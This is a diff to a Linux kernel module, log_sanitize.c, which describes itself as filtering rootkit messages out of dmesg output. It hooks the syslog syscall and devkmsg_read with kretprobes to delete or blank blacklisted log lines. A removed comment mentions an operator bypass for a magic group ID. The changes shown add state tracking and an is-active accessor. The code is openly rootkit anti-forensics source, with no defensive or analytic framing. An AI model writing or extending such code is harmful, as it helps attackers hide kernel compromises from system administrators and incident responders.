@@ -1,18 +1,9 @@
 /*
  * log_sanitize.c: filter rootkit messages from dmesg output
- *
- * Two kretprobes:
- *   __arm64_sys_syslog  — covers dmesg --syslog and klogctl()
- *   devkmsg_read        — covers default dmesg (reads /dev/kmsg)
- *
- * syslog hook: copies the whole buffer, walks it line by line, memmoves
- * out any line containing a blacklisted tag, copies back.
- *
- * devkmsg_read hook: one record per read, so memmove is not viable.
- * Instead, blank the message portion (after the ';') in-place, keeping
- * the byte count unchanged so the caller's read loop continues normally.
- *
- * Operator bypass: MAGIC_GID sees unfiltered output.
+ * kretprobe on _Arm64_sys_syslog and devkmsg_read
+ * 
+ * __arm64_sys_syslog  -+ covers dmesg --syslog and klogctl()
+ * devkmsg_read        -+ covers default dmesg (reads /dev/kmsg)
  */
 
 #include <linux/module.h>
@@ -37,9 +28,7 @@ struct log_sanitize_data {
 	bool         active;
 };
 
-/* ======================================================================== */
 /* syslog syscall hook                                                       */
-/* ======================================================================== */
 
 static int syslog_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
@@ -116,9 +105,7 @@ static struct kretprobe syslog_krp = {
 	.kp.symbol_name = "__arm64_sys_syslog",
 };
 
-/* ======================================================================== */
 /* devkmsg_read hook (/dev/kmsg — default dmesg path)                       */
-/* ======================================================================== */
 
 static int devkmsg_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
@@ -183,9 +170,10 @@ static struct kretprobe devkmsg_krp = {
 	.kp.symbol_name = "devkmsg_read",
 };
 
-/* ======================================================================== */
-/* init / exit                                                               */
-/* ======================================================================== */
+/* state tracking */
+static bool active;
+
+/* public interface,    init / exit                                 */
 
 int log_sanitize_init(void)
 {
@@ -202,6 +190,7 @@ int log_sanitize_init(void)
 		return ret;
 	}
 
+	active = true;
 	pr_info("[log_sanitize] registered\n");
 	return 0;
 }
@@ -210,6 +199,7 @@ void log_sanitize_exit(void)
 {
 	unregister_kretprobe(&devkmsg_krp);
 	unregister_kretprobe(&syslog_krp);
+	active = false;
 	pr_info("[log_sanitize] unregistered\n");
 }
 
@@ -225,4 +215,9 @@ int log_sanitize_enable(void)
 void log_sanitize_disable(void)
 {
 	log_sanitize_exit();
+}
+
+bool log_sanitize_is_active(void)
+{
+	return active;
 }
